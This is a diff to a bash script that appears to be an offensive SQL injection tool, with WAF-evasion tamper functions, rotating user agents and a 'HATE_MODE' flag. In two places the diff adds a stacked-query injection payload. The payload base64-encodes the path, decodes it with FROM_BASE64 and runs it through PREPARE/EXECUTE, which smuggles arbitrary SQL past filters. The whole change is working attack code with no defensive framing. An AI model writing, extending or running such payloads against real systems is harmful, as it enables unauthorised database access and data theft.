@@ -140,7 +140,8 @@ vector_sqli_agressor_left() {
         local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
 local defiance_tamper_path=""
 if [ "$HATE_MODE" = "true" ]; then
-defiance_tamper_path=$(base64_engine "$default_path")
+b64_path=$(base64_engine "$default_path")
+defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_path}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
         else
         local t1=$(between_engine "$default_path")
         local t2=$(charencode_engine "$t1")
@@ -193,7 +194,8 @@ if [ "$HATE_MODE" = "true" ]; then
         fi
 local defiance_tamper_path=""
 if [ "$HATE_MODE" = "true" ]; then
-            defiance_tamper_path=$(base64_engine "$default_path")
+            b64_path=$(base64_engine "$default_path")
+defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_path}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
         else
         local t1=$(between_engine "$default_path")
         local t2=$(charencode_engine "$t1")
